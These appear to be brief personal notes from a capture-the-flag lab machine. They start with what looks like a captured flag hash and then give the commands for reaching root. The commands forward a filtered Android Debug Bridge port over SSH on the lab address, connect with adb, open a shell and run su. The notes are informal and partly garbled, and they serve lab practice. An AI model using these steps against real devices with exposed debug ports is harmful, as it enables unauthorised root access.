f32017174c7c7e8f50c6da52891ae250
==user flag
adb connect ip port but it threw out a time out because the port was filtered im guessing, i assume i need to tunnel the connection to an open port somehow, but im not sure how to ... Check back when IppSec educates me.
Update:

to port forward:

ssh kristi@10.10.10.247 -p 2222 -L 5555:localhost:5555

this will connect to the device as ## UNAME - Linux

fromt there you can exploit freeciv with ADB (AndroidDebuggingBridge)
adb start-server
adb connect $IP:5555
adb shell
su
## Root achieved.
